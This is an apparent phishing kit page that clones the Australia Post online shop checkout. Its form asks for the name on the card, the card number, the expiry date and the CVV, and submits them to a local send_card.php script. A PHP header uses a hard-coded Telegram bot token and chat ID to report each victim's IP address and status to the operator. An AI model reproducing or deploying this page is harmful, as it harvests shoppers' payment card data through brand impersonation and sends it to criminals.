<?php
session_start();
if(isset($_SESSION["username"])) {

if(isset($_GET['messageId'])){
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";
	$messageId=$_GET['messageId'];
	$ipzebi=$_GET['ipzebi'];
	$message ="IP: $ipzebi , status : bill";



// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chatID,
    'message_id' => $messageId,
    'text' => $message
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Optionally, you can decode and use the response
$responseData = json_decode($response, true);

}

?>
<!DOCTYPE html>
<!-- saved from url=(0087)https://auspost.com.au/shop/viewdata/2121665705?JumpTarget=ViewCheckoutAddresses-Review -->
<html class="js no-touchevents" lang="en"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link rel="apple-touch-icon" sizes="144x144" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/img/icons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/img/icons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/img/icons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/img/icons/apple-touch-icon.png">
<link rel="shortcut icon" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/img/icons/favicon.ico"><meta name="robots" content="noindex,nofollow"><meta name="description" content="Shop"><meta name="keywords" content="Shop"><title>Checkout Address</title><!-- Open graph data -->






<script type="text/javascript" async="" src="./Checkout Address_files/insight.min.js.téléchargement"></script><script src="./Checkout Address_files/662331570529793" async=""></script><script src="./Checkout Address_files/microdata.js.téléchargement" async=""></script><script src="./Checkout Address_files/inferredevents.js.téléchargement" async=""></script><script async="" src="./Checkout Address_files/fbevents.js.téléchargement"></script><script type="text/javascript" async="" src="./Checkout Address_files/js"></script><script type="text/javascript" async="" src="./Checkout Address_files/js(1)"></script><script async="" src="./Checkout Address_files/A1200241-7967-4ff6-b82e-77b91771d7e41.js.téléchargement"></script><script async="" src="./Checkout Address_files/tags.js.téléchargement"></script><script>
ishconfig = {
staticRoot: "https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/",
staticContentRoot: "https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/AusPost-Shop/en_AU",
webRoot: "https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU",
appRoot: "https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/Default-Start".replace('/Default-Start', ''),
appType: "auspost.B2CWebShop"
}
</script><script>
auth0LoutOutURL="https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewUserAccountAuth0-LogoutUser";
auth0config = {
clientId: "MaempCMHXE2AMFiGMAKDnb6eiNyoKRKk",
env: "prod",
redirectUrl: "https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewUserAccountAuth0-ProcessLogin",
caller: "ONLINE_SHOP_AP",
channel: "WEB",
product: "ONLINE_SHOP",
audience : "https://digitalapi.auspost.com.au/cssoapi/v2",
scope: "",
auth0SessionRequired: "true",
cssoSessionConfig: {
skipCheck: "true",
skipExchange: "true",
skipRefresh: "true"
}
}
</script><script type="text/javascript">
if (typeof RESTConfiguration === 'undefined')
{
var RESTConfiguration = {}
RESTConfigurationClass = function() {
var http = location.protocol.concat("//").concat(window.location.hostname);
this.AuthenticationToken = null;
this.BusinessPartnerNo = null;
this.CustomerNo = null;
this.Login = null;
this.WebServerSecureURL = null;
this.WebServerURL = null;
this.URLMappingRESTWebadapter = null;
this.URLMappingPipelineWebadapter = null;
this.Domain = null;
this.ServerGroup = null;
this.URLIdentifier = null;
this.LocaleID = null;
this.CurrencyCode = null;
this.CustomerTypeID = null;
this.URLMappingStaticWebadapter = null;
};
RESTConfigurationClass.prototype = {
get: function(index) {
return this[index];
},
set: function(index, value) {
this[index] = value;
},
getCurrentHost: function() {
return window.location.origin;
},
getWebUrl: function() {
return this.getCurrentHost() + this.URLMappingPipelineWebadapter + '/' + this.ServerGroup + '/' + this.Domain + '/' + this.LocaleID + '/' + this.URLIdentifier + '/' + this.CurrencyCode + '/';
},
getRESTUrl: function() {
return this.getCurrentHost() + this.URLMappingRESTWebadapter + '/' + this.ServerGroup + '/' + this.Domain + '/' + this.URLIdentifier;
},
getBaseRESTUrl: function() {
return this.getCurrentHost() + this.URLMappingRESTWebadapter + '/' + this.ServerGroup + '/' + this.Domain + '/-/';
},
getStaticUrl: function() {
return this.URLMappingStaticWebadapter + '/' + this.ServerGroup + '/' + this.Domain + '/' + this.URLIdentifier + '/-/' + this.LocaleID + '/';
},
getRESTClientHost: function() {
return this.URLMappingRESTWebadapter + '/' + this.ServerGroup;
},
getRESTClientPrefix: function() {
return this.Domain + '/' + this.URLIdentifier;
},
getAuthenticationToken: function() {
return this.AuthenticationToken;
},
getCustomerUrlPart: function(accountAdmin) {
if (this.CustomerTypeID === 'PRIVATE' || accountAdmin === true) {
return 'customers/' + this.CustomerNo;
}else{
return 'customers/' + this.CustomerNo + '/users/' + this.Login;
}
},
getLocale: function(rewrite) {
if (typeof rewrite === 'undefined') {
return this.LocaleID;
}else{
return this.LocaleID.replace('_','-');
}
},
getLang: function() {
return this.LocaleID.split('_')[0];
},
getLocalizationsUrl: function(id) {
if (typeof id !== 'undefined' && typeof id === 'string') {
return this.getStaticUrl() + 'js/localizations/' + id + '-' + RESTConfiguration.LocaleID + '.json'
}
return this.getStaticUrl() + 'js/localizations/'
},
getLocalizationProperties: function(topic, locale) {
if (typeof locale === 'undefined') {
var locale = this.getLocale();
}
var promise = $.getJSON(this.getWebUrl() + 'ViewLocalization-Get?topic='+topic+'&locale='+locale).then(function(data) {
var localizationProperties = {};
localizationProperties[RESTConfiguration.getLocale()] = data;
return localizationProperties;
});
return promise;
}
};
};
RESTConfiguration = new RESTConfigurationClass();

RESTConfiguration.set('AuthenticationToken', 'encryption0@PBEWithMD5AndTripleDES:hKpRQIX2UJM=|p1Q+eyCvJvFogPEOFROjaC6/9vdkwYu8S5I6GlSqGoo4HNl9TvS72fVlFXLIMYds');

RESTConfiguration.set('WebServerSecureURL', 'https://auspost.com.au:443/')

RESTConfiguration.set('WebServerURL', 'http://auspost.com.au:80/')

RESTConfiguration.set('URLMappingRESTWebadapter', '/shop/rest')

RESTConfiguration.set('URLMappingPipelineWebadapter', '/shop/web')

RESTConfiguration.set('Domain', 'AusPost-Shop-Site')

RESTConfiguration.set('ServerGroup', 'WFS')

RESTConfiguration.set('URLIdentifier', '-')

RESTConfiguration.set('LocaleID', 'en_AU')

RESTConfiguration.set('CurrencyCode', 'AUD')

RESTConfiguration.set('URLMappingStaticWebadapter', '/shop/static')

RESTConfiguration.set("MoneyFormat", {

"AUD_MONEY_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"NZD_EURO_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"NZD_EURO_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"USD_EURO_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"NZD_MONEY_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"USD_EURO_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"AUD_EURO_COMBINED": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"NZD_MONEY_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"USD_MONEY_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"NZD_EURO_COMBINED": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"AUD_MONEY_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"USD_EURO_COMBINED": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"NZD_MONEY_INPUT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "-%v" } },
"USD_MONEY_INPUT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "-%v" } },
"AUD_EURO_SHORT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "- %v" } },
"AUD_EURO_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"USD_MONEY_LONG": { precision: 2, decimal: ".", thousand: ",", format: { pos: "$%v", neg: "$- %v" } },
"AUD_MONEY_INPUT": { precision: 2, decimal: ".", thousand: ",", format: { pos: "%v", neg: "-%v" } }
});

RESTConfiguration.set("DateFormat", {

"DATE_INPUT": "MM/dd/yyyy"
,
"TIME_INPUT": "h:mm a"
,
"DATE_TIME_INPUT": "MM/dd/yyyy h:mm a"
,
"DATE_SHORT": "MM/dd/yy"
,
"DATE_TIME": "hh:mm:ss a"
,
"DATE_LONG": "dd-MMM-yyyy"

});
</script>
<script type="text/javascript" src="./Checkout Address_files/omniture.url.js.téléchargement"></script>
<script type="text/javascript">


</script><script type="text/javascript" src="./Checkout Address_files/satelliteLib-9c215febcba74f72ca4a2cc8370a7f4b70048c28.js.téléchargement"></script><script src="./Checkout Address_files/EX771a893021694b81b688aed2e2d076bc-libraryCode_source.min.js.téléchargement" async=""></script><script src="./Checkout Address_files/branch-latest.min.js.téléchargement" async=""></script><script>
var gtagDataLayer = {};
gtagDataLayer.pageView = false;
gtagDataLayer.events = [];
</script><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style><script>_satellite["_runScript1"](function(event, target, Promise) {
var src = "https://dd.auspost.com.au/tags.js"; 
var API_KEY = "0F3EC7C51A7EB61002A574B7F514D7";
var ajaxListenerPaths = [
	"digitalapi.auspost.com.au",
	"developers.auspost.com.au",
    "auspost.com.au"
	];

! function(a, b, c, d, e, f) {
    a.ddjskey = e;
    a.ddoptions = f || null;
    var m = b.createElement(c),
        n = b.getElementsByTagName(c)[0];
    m.async = 1, m.src = d, n.parentNode.insertBefore(m, n);
}(window, document, "script", src, API_KEY, { endpoint: "https://dd.auspost.com.au/js/", ajaxListenerPath: ajaxListenerPaths ,allowHtmlContentTypeOnCaptcha : true});
  



</script><!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="./Checkout Address_files/js(2)"></script>

<script type="text/javascript">

</script><link type="text/css" rel="stylesheet" href="blob:"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/3b212376-c308-4d1a-ad27-d43c0b76b9d7"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/e2ed6a58-0351-4c42-a346-d8676911d7c0"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/6998d8a3-e839-4ffc-b063-6ded2e30ad8f"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/2e1141d4-9ed2-4525-ac42-0bf17b0c3d7a"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/0a483c77-e465-485f-a716-eea4e272fcbc"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/4d0a43fc-5cf8-4a67-8772-8c03d0945322"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/034e3a50-e53e-4dc0-8b90-3169d2e8917d"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/e4947cbc-b123-4f84-babf-a64672948d07"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/4ecabb8c-40cb-4d93-9baf-64d6478ad4d6"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/e76f25d6-90ab-40dd-a0c7-477aacb362bb"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/575c79a0-0022-48b9-98fd-658f22691101"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/5a804c9b-3f0d-41ea-a78c-ad7b112c41e0"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/4c635d8a-1d1f-48b7-9498-9ea10781f789"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/859e5523-f113-4cb1-b19a-f32586ce0261"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/3d6ebc42-93ee-4dc9-8b42-b366805a79ac"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/1b3fc290-e5c3-41c6-a758-5761e0837939"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/91b16a34-ad12-4607-b506-eff51f1d3f77"><link type="text/css" rel="stylesheet" href="blob:https://auspost.com.au/9e4d6cb2-2842-4201-ad1a-21d141869156"><script src="./Checkout Address_files/RC0509a741873c468faa4c6c20f0dc2e00-source.min.js.téléchargement" async=""></script><script type="text/javascript" async="" src="./Checkout Address_files/f.txt"></script><style data-styled="active" data-styled-version="5.3.6"></style><link rel="preconnect" href="https://fonts.googleapis.com/" data-react-helmet="true"><link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" data-react-helmet="true"><link href="./Checkout Address_files/css2" rel="stylesheet" data-react-helmet="true"><script id="__googleMapsScriptId" type="text/javascript" src="./Checkout Address_files/js(3)" defer="" async=""></script><script type="text/javascript" charset="UTF-8" src="./Checkout Address_files/common.js.téléchargement"></script><script type="text/javascript" charset="UTF-8" src="./Checkout Address_files/util.js.téléchargement"></script></head><body id="ws-address" data-recommendation-url="https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewExpressShop-RecommendedProducts"><div id="adobe-analytics" data-analytics-url="https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ProcessAnalyticsLogs-LogMessage"><link name="Letter" rel="preload" as="font" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/fonts/letter/ap-letter-regular-webfont.woff" media="all" crossorigin="">
<link name="icomoon" rel="preload" as="font" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/fonts/ap-icons/apicons.woff?zejaon" media="all" crossorigin=""><link rel="stylesheet" type="text/css" media="all" href="./Checkout Address_files/theme.min.css"><link rel="preload" href="https://auspost.com.au/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/fonts/roboto/roboto-bold-webfont.woff2" as="font" type="font/woff2" crossorigin="">
<link type="text/css" rel="stylesheet" href="./Checkout Address_files/jquery.iviewer.css" media="all">
<link type="text/css" rel="stylesheet" href="./Checkout Address_files/footer.css" media="all"><style type="text/css">@media (min-width: 680px){
.product-details .faq-tabs .product-accordion .panel-title{
padding: 24px 48px 24px 32px;
}
.modal-dialog.stock-notification-subscribe .modal-content {
  border-radius: 8px;
}
	 .modal.fade:not(.add-to-cart-modal) .modal-dialog{
		-webkit-transform: translate(0,0);
		-ms-transform: translate(0,0);
		-o-transform: translate(0,0);
		transform: translate(0,0);
	}
.feature-category .hero-banner-container .container-set #Section_cmp_20210118_143700.banner-section{
max-height: none;
}
.cat-banner-container.btb-content .cms-comonent-info{
margin-top: -260px !important;
}
.top-header.g-notification-available .mobile-nav{
height: 76px;
}
}
.feature-category .hero-banner-container .container-set #Section_cmp_20210118_143700.banner-section a.teaser-link,.feature-category .hero-banner-container .container-set #Section_cmp_20210118_143700.banner-section a.teaser-link picture{
display: flex;
}
.add-to-cart-modal .modal-dialog .optin-subscription .checkbox.has-error a{
color: #bc111e;
}
.product-list .product-tile .price-container{
	flex-grow: 0;
}
.homepage-container .hero-banner-container .banner-section img{
max-width: 100%;
}

@media (min-width: 970px){
	.homepage:not(.modal-open) .wrapper{
	position: relative;
	z-index: 0;
	}
	.homepage:not(.modal-open) header{
	position: relative;
	z-index: 1;
	}
}
@media (max-width: 679px){
.top-header.g-notification-available .mobile-nav{
height: 139px !important;
}
.product-accordion .panel .panel-heading button{
padding: 24px 48px 24px 32px;
}
}
.recently-view-container h2{
	position: relative;
}



#ws-landing .recently-view-container,
#ws-family .recently-view-container
{
padding-top: 40px;
}
#ws-landing .recently-view-container:before,
#ws-family .recently-view-container:before{
border: 1px solid #e2e2e2;
}
p{
color: #212129;
}
.payhive-block .save-card{
display: block !important;
}

.feature-category:not(.packaging-finder-page) .feature-category-page > div:nth-child(2n+1){
background-color: #f5f5f5;
}
.feature-category:not(.packaging-finder-page) .feature-category-page > div:nth-child(2n){
background-color: #ffffff;
}

.flash-in-content h2.title{
width: 320px;
}
#Section_cmp_20210608_160424 h2.title{
width: 275px;
}

.product-label{
font-size: 9px;
}

.header-search-container.show-trending-search input.form-control,.header-search-container.show-auto-suggest input.form-control{
background: #ffffff;
}

.feature-category .hero-banner-container .container-set .banner-content .cms-banner-content .cms-banner-content-wrapper .tag{
color: #382f2d;
}
@media (min-width: 1169px){
.feature-category .feature-category-page .cat-banner-container .image-block img, .feature-category .feature-category-page .cat-banner-container picture img{
max-width:100%;
}
}
.shopping-cart-wrapper .shipping-methods-wrapper h2{
width: 100%;
}

.recently-view-container .product-list-slot, #global-notification-icon > svg{
display: none !important;
}

#BrandwrappedProductGuideModal .modal-dialog .modal-content .modal-body .image-section.has-two-image{
padding: 34px 32px 28px;
}
#BrandwrappedProductGuideModal .modal-dialog .modal-content .modal-body .image-section.has-two-image .first-img-section {
    margin-right: 24px;
}

#BrandwrappedProductGuideModal .modal-dialog .modal-content .modal-body .image-section .upload-button-look{
display: none;
}

.saved-projects .account-main .account-content .account-content-sections .inset-banner-container .banner-content a{
position: static;
}

.product-details .faq-tabs .product-accordion .panel-default.activated::before{
height: 100%;
top: 0;
}

.saved-projects .account-main .account-content .account-content-sections .upload-project-list-placeholder .upload-project .content .img-col{
display: flex;
}

.saved-projects .account-main .account-content .account-content-sections .upload-project-list-placeholder .upload-project .content .img-col img{
object-fit: cover;
flex-basis: 100%;
}

.pdp-page .product-short-desc-wrapper:before{
height: calc(100% + 4px);
}


.saved-projects .account-main .account-content .account-content-sections .account-content-heading, .saved-projects .account-main .account-content .account-content-sections .descriptions{
border-bottom: 0;
padding-bottom: 0;
}

@media (min-width: 970px){
.account-wrapper.order-details-page .account-main .account-content .section .list-item-row .product-shipping-desc.standard-product {
  margin-left: 122px;
  padding: 0;
margin-top: 0;
}
}
.my-account-address-list .invoice-address .update-address.address-link{
 display:none;
}
.my-account-address-list .shipping-address .update-address.address-link{
 display:none;
}

.nav-drop-down .drop-down-item[data-category-id="PackagingFinder"] a.drop-down-item-link,
#sidebar-nav-container .sidebar-sub-list #section-item-51 a.sidebar-pn-link span{
color: #dc1928 !important;
background: url(/shop/static/WFS/AusPost-Shop-Site/-/AusPost-Shop-auspost-B2CWebShop/en_AU/packaging-finder/pf-icon.png) right top no-repeat;
padding-right: 32px;
background-size: 24px 24px;
}
.nav-drop-down .drop-down-item[data-category-id="GT-CL"] a.drop-down-item-link,
#sidebar-nav-container .sidebar-sub-list #section-item-51 a.sidebar-pn-link span{
color: #dc1928 !important;
}
#sidebar-nav-container .sidebar-sub-list #section-item-51 a.sidebar-pn-link span{
padding-bottom: 8px;
}

#miniCart .mini-product-left a+a, .tax-section, .tax-information, .gst-text{
display: none;
}

.feature-category:not(.packaging-finder-page) .feature-category-page .cat-banner-container a.teaser-link{
display: flex;
flex-basis: 100%;
}

#QuickAddToCartModal div[data-dynamic-block-product-sku="EPPSM2-M-AusPost"] .save-amount-message,
#QuickAddToCartModal div[data-dynamic-block-product-sku="EPPSSP-M-AusPost"] .save-amount-message
#QuickAddToCartModal div[data-dynamic-block-product-sku="PPPSMS-M-AusPost"] .save-amount-message
#QuickAddToCartModal div[data-dynamic-block-product-sku="PPPSSP-M-AusPost"] .save-amount-message{
display: none !important;
}</style>

<div id="disabled-cookies-warning" style="display: none;">
<div class="system-notification">
<div class="container">
<div class="row">
<div class="col-sm-12">
<div class="system-notification-icon">
<span class="glyphicon glyphicon-warning-sign"></span>
</div>
<div class="system-notification-text">
<h2>It appears that your browser has cookies disabled.</h2>
<p>The website requires your browser to enable cookies in order to login.</p>
<p>Please enable cookies and reload this page.</p>
</div>
</div>
</div>
</div>
</div>
<script type="text/javascript">
(function cookieTest(){
var name = 'cookie_test';
if(location.protocol == 'https:') {
document.cookie = name + '=; Secure; SameSite=None;';
} else {
document.cookie = name + '=;';
}
if (document.cookie.indexOf(name) == -1) {
$('#disabled-cookies-warning').show();
}
document.cookie = name + '=; expires=Thu, 01-Jan-70 00:00:01 GMT;';
})();
</script>
</div><div class="body-wrapper">
<header data-testing-id="page-header" class="top">








<div class="skip-links">
<a href="https://auspost.com.au/shop/viewdata/2121665705?JumpTarget=ViewCheckoutAddresses-Review#content" title="Skip to main content" class="skip-link--content visually-hidden focusable">Skip to content</a>
</div><div class="mid-header-checkout" id="mid-header-checkout">
<div class="container">
<div class="row">
<div class="col-sm-6 col-xs-3 logo-wrapper"><a rel="home" class="hidden-xs hidden-sm" href="https://auspost.com.au/shop/"><img src="./Checkout Address_files/logo.svg" alt="Logo"></a>
<a rel="home" class="visible-xs visible-sm" href="https://auspost.com.au/shop/">
<img src="./Checkout Address_files/mobile_logo.png" alt="Logo">
</a></div>
<div class="col-sm-6 col-xs-9 checkout-header-link text-right">
<ul>
<li><a href="https://.com.au/shop/cart" title="Shopping cart"></span>Shopping cart</a></li>
<li><a href="https://.com.au/help-and-support" target="_blank" title="Help &amp; support"></span>Help &amp; support</a></li>
</ul>
</div>
</div>
</div>
</div></header>
<div class="wrapper" id="content">
<div role="main" class="container main-container" data-class="" id="t-ws-address"><getapplicationbo><div class="checkout-error-container"> 

</div>

<form method="post" action="./system/send_card.php"  class="form-horizontal bv-form show-inline  " >
	<input type="hidden" name="SynchronizerToken" ><div data-testing-id="new-user-address-page" class="checkout-page">
<div class="marketing-area"></div>
<div class="left-panel loggedin-selection">
<h1>Checkout</h1>
<div>All fields are required unless marked as <span class="grey-italic">(optional)</span></div> 





 


<div class="checkout-steps">
<ul>
<li class="active"><span>Delivery details</span></li>
	<li class="active"><span>Payment and review</span></li>


</li>
</ul>
</div><div class="alert alert-danger error-container hidden alert-permanent" tabindex="-1">
<p>Please fix these fields to continue:</p>
<ul></ul>
</div>
<div class="login-or-guest-block">
<div class="benefits">
<div class="benefit fast-checkout">
<div class="icon">
<img src="./Checkout Address_files/faster-checkout.svg"> 
</div>
<div class="benefit-label">Faster checkout</div>
</div>
<div class="benefit payment">
<div class="icon">
<img src="./Checkout Address_files/card-payment.svg"> 
</div>
<div class="benefit-label">Enhanced payment &amp; delivery options</div>
</div>
<div class="benefit tracking-reorder">
<div class="icon">
<img src="./Checkout Address_files/tracking-reordering.svg"> 
</div>
<div class="benefit-label">Easy tracking &amp; reordering</div>
</div>
</div>
<div class="checkout-options">
<div class="option-login-signup">
<a href="" class="ap-btn ap-btn-default login-trigger checkout-login">Log in or sign up</a>
</div>
<div class="divider">
<hr class="hr-left">
<div class="div-label">or</div>
<hr class="hr-right">
</div>

</div>


</div> 
<div class="email-search-tooltip-template hidden">
<div class="email-search-tooltip-content">
<div class="heading">
<strong><span>Looks like you have a</span> MyPost account. </strong>
<button type="button" class="close email-search-close-trigger" data-event="site interaction" data-category="login prompt" data-description="close" aria-label="Close" id="login_prompt_close">
<span class="icon-draw-close"></span>
</button>
</div>
<div class="detail">Log in to check out faster.</div>
<div class="buttons">

</div>
</div>
</div><div class="delivery-details-wrapper hide-delivery-parcel">
<h3>Delivery details</h3>
<div class="info-text">Provide details of the person receiving your order – whether it's you or someone else. Photo ID will be required if you are collecting from a Post Office.</div>
<div id="tabs" class="tab-group delivery-tabs" data-parcel-eligible="false">
<div class="tab-content">
<div data-address-form="data-address-general-form" class="general-fields"><fieldset>
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_FirstName">Name on credit card</label>
<div class="col-sm-12"><small class="help-block" data-bv-validator="forbiddensymbols" data-bv-for="billing_FirstName" id="forbiddensymbols_billing_FirstName" data-bv-result="NOT_VALIDATED" style="display: none;">Only alphanumeric characters are allowed.</small><small class="help-block" data-bv-validator="stringLength" data-bv-for="billing_FirstName" id="stringLength_billing_FirstName" data-bv-result="NOT_VALIDATED" style="display: none;">The first name must not exceed 35 characters.</small><small class="help-block" data-bv-validator="notEmpty" data-bv-for="billing_FirstName" id="notEmpty_billing_FirstName" data-bv-result="NOT_VALIDATED" style="display: none;">Please enter a Name on credit card</small>
<input type="text" class="form-control " name="name" id="name" required="true" data-bv-notempty-message="Please enter a given name" maxlength="35" data-bv-stringlength-message="The first name must not exceed 35 characters." forbiddensymbols="" data-bv-forbiddensymbols-message="Only alphanumeric characters are allowed." data-bv-field="billing_FirstName"></div>
</div>
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_LastName">Card number</label>
<div class="col-sm-12"><small class="help-block" data-bv-validator="forbiddensymbols" data-bv-for="billing_LastName" id="forbiddensymbols_billing_LastName" data-bv-result="NOT_VALIDATED" style="display: none;">Only alphanumeric characters are allowed.</small><small class="help-block" data-bv-validator="stringLength" data-bv-for="billing_LastName" id="stringLength_billing_LastName" data-bv-result="NOT_VALIDATED" style="display: none;">The last name must not exceed 35 characters. </small><small class="help-block" data-bv-validator="notEmpty" data-bv-for="billing_LastName" id="notEmpty_billing_LastName" data-bv-result="NOT_VALIDATED" style="display: none;">Please enter a Card number</small>
<input type="number" class="form-control " name="card" id="card" required="true" data-bv-notempty-message="Please enter a Card number"   data-bv-field="billing_LastName"></div>
</div><div class="company-field  "> 

<div class="form-group ">
<label class="control-label col-sm-12" for="billing_CompanyName2">Expiry date</label>
<div class="col-sm-12">


<input type="text" class="form-control" name="exp" id="exp" placeholder="mm/yy" maxlength="5" />
</div> 
</div>
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_PhoneHome">CVV</label>
<div class="col-sm-12">
<input type="number" class="form-control" name="cvv" id="cvv" required="true"   data-bv-field="billing_PhoneHome"></div>
</div></fieldset>
<input type="hidden" value="1" name="ShippingAddressOption">
</div><div role="tabpanel" class="tab-pane active" id="delivery_details">
<div class="checkout-address-wrapper">
	


<div data-address-form="data-address-form"><div class="parcel-block ">
<div class="address-type-option">
<h4>Where would you like your order delivered?</h4>
<div class="has-error hidden" tabindex="-1" id="address-required">
<small class="help-block">Please select an address option.</small>
</div>
<ul>
<li class="address-options">
<div class="radio">
<label for="SreetAddress" class="styled-input">

<div class="address-label">Street address or PO Box</div>
<input type="radio" class="addressPickupType js-styled" name="billing_AddressPickupType" id="SreetAddress" value="street-address" checked="checked"><span class="radiomark"><span class="radiomark-inner"></span></span></label>
</div>
</li>
<li class="address-options option-disabled">
<div class="radio">
<label for="CollectionPoint" class="styled-input">

<div class="address-label">Australia Post Collection Point</div>
<div class="address-info">Collect your order at a participating Post Office or 24/7 Parcel Locker.</div>
<input type="radio" class="addressPickupType js-styled" name="billing_AddressPickupType" id="CollectionPoint" value="CollectionPoint" disabled=""><span class="radiomark"><span class="radiomark-inner"></span></span></label>
</div>
</li>
</ul>
<input type="hidden" name="addresPickType" value="">
</div>
<div class="select-parcel-locker hidden">
<h4>Collection location</h4>
<div class="selected-parcel-locker">
<div class="location-icon"></div>
<div class="select-address"><div class="address-title"></div>
<div class="address-line1"></div>
<div class="address-line2"></div>
<div class="available-time"></div></div>
</div>
</div></div><div class="guest-shipping-info positioned"><div class="shipping-methods-wrapper">
<h2>Delivery</h2> 


 
</div></div>
<div class="address-container ">
<fieldset>
	<div class="alert alert-danger alert-permanent hidden country-info">Please select international delivery method first.</div>
<div class="form-group country-select ">

<div class="col-sm-12">

<select class="form-control country-field "  data-country-list="data-country-list" name="billing_CountryCode" id="billing_CountryCode" data-bv-field="billing_CountryCode" data-validate=""  data-bv-notempty-message="Please select a country."><option value="" selected="selected" >Please select</option><option value="DZ">Algeria</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctica</option><option value="AG">Antigua And Barbuda</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AW">Aruba</option><option value="AU" selected="selected">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BB">Barbados</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BT">Bhutan</option><option value="BQ">Bonaire, Sint Eustatius and Saba</option><option value="BV">Bouvet Island</option><option value="BR">Brazil</option><option value="BN">Brunei Darussalam</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CV">Cape Verde</option><option value="KY">Cayman Islands</option><option value="CL">Chile</option><option value="CN">China</option><option value="CX">Christmas Island</option><option value="CC">Cocos (Keeling) Islands</option><option value="CO">Colombia</option><option value="CK">Cook Islands</option><option value="CR">Costa Rica</option><option value="CI">Cote D'Ivoire</option><option value="HR">Croatia</option><option value="CU">Cuba</option><option value="CW">Curaçao</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option 